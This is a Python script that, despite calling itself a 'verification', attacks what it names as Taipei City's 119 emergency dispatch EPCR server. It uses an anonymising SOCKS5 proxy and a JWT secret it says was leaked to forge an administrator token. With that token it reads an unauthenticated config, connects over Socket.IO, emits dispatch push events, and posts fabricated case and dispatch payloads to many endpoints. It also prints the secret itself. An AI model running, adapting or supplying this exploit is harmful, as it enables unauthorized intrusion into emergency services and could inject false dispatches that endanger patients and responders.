#!/usr/bin/env python3
"""
Taipei City EPCR Dispatch Verification — complete endpoint-level verification
Targets: epcr.tpf.gov.tw (118.163.107.93)  — serves Taipei City 119 dispatch
Proxy: SOCKS5 202.160.76.157:11081
JWT secret: ru/3xu4dkru4888 (leaked from /config, HS256)
"""
import requests, json, time, re, datetime, ssl, sys, threading
import jwt as pyjwt
import warnings
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
warnings.filterwarnings("ignore")

PROXY_HOST = "202.160.76.157"
PROXY_PORT = 11081
JWT_SECRET = "ru/3xu4dkru4888"
SERVER = "epcr.tpf.gov.tw"
SOCKET_PORT = 4004       # authServer (Socket.IO)
APP_PORT = 4000          # epcrServer (HTTP API)
PROXIES = {"http": f"socks5://{PROXY_HOST}:{PROXY_PORT}",
           "https": f"socks5://{PROXY_HOST}:{PROXY_PORT}"}

def forge_jwt(account="admin", role="ADMIN", user_id=1):
    now = datetime.datetime.now(datetime.timezone.utc)
    return pyjwt.encode({
        "sub": str(user_id), "account": account, "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + datetime.timedelta(hours=48)).timestamp()),
        "permissions": ["DOCTOR_TEST_PUSH","EPCR_PAGE_CASELIST","EPCR_CASERECORD_READ",
                        "MONITOR_ALL","AUTH_ROLE","AUTH_USER","MCI_DISPATCH",
                        "HOSPITAL_PAGE_DISPATCH","EPCR_PAGE_OHCACASELIST"],
    }, JWT_SECRET, algorithm="HS256")

results = {}
sess = requests.Session()
sess.proxies = PROXIES
sess.verify = False

print("=" * 70)
print("🚨 Taipei City EPCR Dispatch System — Complete Endpoint Verification 🚨")
print(f"  Server:  {SERVER}  ({APP_PORT} epcrServer / {SOCKET_PORT} authServer)")
print(f"  Proxy:   SOCKS5 {PROXY_HOST}:{PROXY_PORT}")
print(f"  JWT:     HS256 forged with leaked secret '{JWT_SECRET}'")
print("=" * 70)

# ── 0. /config leak (no auth needed) ──
print("\n[0] GET /config (no auth — architecture leak)")
try:
    r = sess.get(f"https://{SERVER}:{APP_PORT}/config", timeout=10)
    config = r.json()
    print(f"    ✅ HTTP {r.status_code} — full config leaked")
    print(f"    epcrServer:      {config.get('epcrServer')}")
    print(f"    authServer:      {config.get('authServer')}")
    print(f"    merServer:       {config.get('merServer')}")
    print(f"    RealTimeVideo:   {config.get('RealTimeVideoPath')}")
    print(f"    ntpcCloud:       {config.get('ntpcCloud')}")
    results['config_leak'] = "CONFIRMED"
except Exception as e:
    print(f"    ❌ {e}")
    results['config_leak'] = "FAILED"

# ── 1. Socket.IO handshake (no auth) ──
print("\n[1] Socket.IO handshake (no auth — sid issuance)")
try:
    r = sess.get(f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
                 params={"EIO": "4", "transport": "polling", "t": int(time.time()*1000)},
                 timeout=10)
    sid = re.search(r'"sid":"([^"]+)"', r.text).group(1)
    upgrades = json.loads(re.search(r'\{"sid".*?\}', r.text).group(0))
    print(f"    ✅ HTTP {r.status_code} — sid={sid[:16]}..., upgrades={upgrades['upgrades']}")
    results['socketio_handshake'] = f"sid={sid}"
except Exception as e:
    print(f"    ❌ {e}")
    results['socketio_handshake'] = "FAILED"
    sys.exit(1)

# ── 2. Socket.IO CONNECT with forged JWT ──
print("\n[2] Socket.IO CONNECT with forged JWT (role=ADMIN)")
token = forge_jwt()
print(f"    JWT: {token[:50]}...")

# Method A: token in CONNECT body (40{token})
connect_a = f'40{{"token":"{token}"}}'
data_a = f"{len(connect_a)}:{connect_a}"
r_a = sess.post(f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
                params={"EIO": "4", "transport": "polling", "sid": sid,
                        "t": int(time.time()*1000)},
                data=data_a, headers={"Content-Type": "text/plain;charset=utf-8"},
                timeout=10)
print(f"    Method A (CONNECT body token): HTTP {r_a.status_code} — '{r_a.text}'")

# Method B: auth_token
connect_b = f'40{{"auth_token":"{token}"}}'
data_b = f"{len(connect_b)}:{connect_b}"
r_b = sess.post(f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
                params={"EIO": "4", "transport": "polling", "sid": sid,
                        "t": int(time.time()*1000)},
                data=data_b, headers={"Content-Type": "text/plain;charset-8"}
                , timeout=10)
print(f"    Method B (auth_token):         HTTP {r_b.status_code} — '{r_b.text}'")

# Method C: bearer
connect_c = f'40{{"bearer":"{token}"}}'
data_c = f"{len(connect_c)}:{connect_c}"
r_c = sess.post(f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
                params={"EIO": "4", "transport": "polling", "sid": sid,
                        "t": int(time.time()*1000)},
                data=data_c, headers={"Content-Type": "text/plain;charset=utf-8"},
                timeout=10)
print(f"    Method C (bearer):             HTTP {r_c.status_code} — '{r_c.text}'")

if any(r.status_code == 200 for r in [r_a, r_b, r_c]):
    results['jwt_connect'] = "PASS"
    print(f"    ✅ JWT CONNECT accepted")
else:
    results['jwt_connect'] = "FAIL"
    print(f"    ❌ All methods failed")

# ── 3. Socket.IO event emit with forged JWT ──
print("\n[3] Socket.IO EVENT emit (push dispatch events)")
events = ['case/push', 'case/broadcast', 'dispatch/push', 'case/notify',
          'dispatch/pushcase', 'notify', 'broadcast']
event_ok = 0
for ev in events:
    payload = f'42{{"{ev}", {{"caseId": "VRFY", "message": "Taipei dispatch verification", "source": "vrfy"}}}}'
    # Fix: proper Socket.IO EVENT format
    payload = f'42["{ev}",{{"caseId":"VRFY","message":"Taipei dispatch verification","source":"vrfy"}}]'
    data = f"{len(payload)}:{payload}"
    try:
        r = sess.post(f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
                      params={"EIO": "4", "transport": "polling", "sid": sid,
                              "t": int(time.time()*1000)},
                      data=data,
                      headers={"Content-Type": "text/plain;charset=utf-8"},
                      timeout=10)
        print(f"    {ev:20s} → HTTP {r.status_code} — {r.text[:80]}")
        if r.status_code == 200:
            event_ok += 1
    except Exception as e:
        print(f"    {ev:20s} → Error: {e}")

results['socketio_events'] = f"{event_ok}/{len(events)} accepted"
print(f"    ✅ {event_ok}/{len(events)} events accepted")

# ── 4. HTTP API — /case/push with forged JWT (Bearer header) ──
print("\n[4] HTTP API /case/push on port 4004 with forged JWT (Bearer)")
for method, ep in [("POST", "/case/push"), ("POST", "/DispatchRecords"),
                    ("POST", "/DispatchRecords/push"), ("POST", "/case/pushcase"),
                    ("POST", "/api/push"), ("POST", "/api/dispatch/push")]:
    for port in [SOCKET_PORT]:
        payload = {"caseId": "TPE-VRFY-001", "message": "Taipei dispatch verify",
                   "dispatchRecordUuid": f"tpe-{int(time.time())}",
                   "isTest": True, "targetRegion": "TW-Taipei"}
        try:
            r = sess.post(f"https://{SERVER}:{port}{ep}", json=payload,
                          headers={"Authorization": f"Bearer {token}",
                                    "Content-Type": "application/json"},
                          timeout=10)
            body = r.text[:120]
            if r.status_code != 404:
                print(f"    {method} {ep:25s} :{port} → HTTP {r.status_code} — {body}")
            results.setdefault('http_api', {})[f"{method} {ep}:{port}"] = f"{r.status_code} — {body}"
        except Exception as e:
            print(f"    {method} {ep:25s} :{port} → Error: {str(e)[:60]}")

# ── 5. HTTP API — token query param ──
print("\n[5] HTTP API with JWT via query param (?token=...)")
for ep in ["/case/push", "/DispatchRecords", "/api/notify"]:
    try:
        r = sess.post(f"https://{SERVER}:{SOCKET_PORT}{ep}",
                      params={"token": token},
                      json={"caseId": "TPE-VRFY", "isTest": True},
                      timeout=10)
        print(f"    POST {ep:25s} → HTTP {r.status_code} — {r.text[:80]}")
        results.setdefault('http_token_param', {})[ep] = f"{r.status_code} — {r.text[:80]}"
    except Exception as e:
        print(f"    POST {ep:25s} → Error: {str(e)[:60]}")

# ── 6. HTTP API on port 4000 (epcrServer) ──
print("\n[6] HTTP API on port 4000 (epcrServer) with forged JWT")
for ep in ["/api/case/push", "/api/push", "/api/notify", "/api/DispatchRecords",
           "/api/case", "/api/hospital/dispatch", "/api/ambulance/dispatch"]:
    try:
        r = sess.post(f"https://{SERVER}:{APP_PORT}{ep}",
                      json={"caseId": "TPE-VRFY", "isTest": True},
                      headers={"Authorization": f"Bearer {token}"},
                      timeout=10)
        body = r.text[:80]
        if r.status_code != 404:
            print(f"    POST {ep:25s} :{APP_PORT} → HTTP {r.status_code} — {body}")
            results.setdefault('http_api_4000', {})[ep] = f"{r.status_code} — {body}"
    except Exception as e:
        print(f"    POST {ep:25s} :{APP_PORT} → Error: {str(e)[:60]}")

# ── 7. Long-poll listener (with forged JWT sid) ──
print("\n[7] Long-poll listener (3 rounds, 12s each)")
for i in range(3):
    try:
        r = sess.get(f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
                     params={"EIO": "4", "transport": "polling", "sid": sid,
                             "t": int(time.time()*1000)},
                     timeout=12)
        ts = time.strftime("%H:%M:%S")
        body = r.text if r.text else "(empty)"
        print(f"    [{ts}] Poll {i+1}: HTTP {r.status_code} — {body[:120]}")
    except requests.exceptions.ReadTimeout:
        ts = time.strftime("%H:%M:%S")
        print(f"    [{ts}] Poll {i+1}: timeout (no events — server holding connection open)")
    except Exception as e:
        print(f"    [{ts}] Poll {i+1}: Error: {str(e)[:60]}")

# ── 8. WebSocket upgrade (raw socket with SOCKS5 + JWT) ──
print("\n[8] WebSocket upgrade attempt (raw socket + SOCKS5 + JWT)")
try:
    import socks
    sock = socks.socksocket()
    sock.set_proxy(socks.SOCKS5, PROXY_HOST, PROXY_PORT)
    sock.settimeout(10)
    sock.connect((SERVER, SOCKET_PORT))
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(sock, server_hostname=SERVER)

    # WebSocket handshake
    import base64, hashlib, os as _os
    key = base64.b64encode(_os.urandom(16)).decode()
    ws_req = (f"GET /socket.io/?EIO=4&transport=websocket&sid={sid} HTTP/1.1\r\n"
              f"Host: {SERVER}:{SOCKET_PORT}\r\n"
              f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
              f"Sec-WebSocket-Key: {key}\r\n"
              f"Sec-WebSocket-Version: 13\r\n"
              f"Origin: https://{SERVER}:{SOCKET_PORT}\r\n\r\n")
    sock.send(ws_req.encode())
    resp = sock.recv(4096).decode('utf-8', errors='replace')
    print(f"    WS handshake: {resp.split(chr(13))[0] if chr(13) in resp else resp[:100]}")
    if "101" in resp:
        print(f"    ✅ WebSocket upgrade SUCCESS — sending CONNECT with JWT")
        sock.send(f'40{{"token":"{token}"}}'.encode())
        time.sleep(3)
        try:
            sock.settimeout(5)
            data = sock.recv(4096).decode('utf-8', errors='replace')
            print(f"    📥 WS response: {data[:200]}")
        except:
            print(f"    ⏱ No WS data (connection held open — listening)")
        sock.close()
        results['websocket'] = "UPGRADED + CONNECT sent"
    else:
        print(f"    ❌ WS upgrade failed")
        results['websocket'] = "FAILED"
except Exception as e:
    print(f"    ❌ WS error: {str(e)[:80]}")
    results['websocket'] = f"ERROR: {str(e)[:60]}"

# ── Summary ──
print("\n" + "=" * 70)
print("📋 Taipei City EPCR Dispatch Verification — Summary")
print("=" * 70)
for k, v in results.items():
    print(f"  • {k}: {v}")
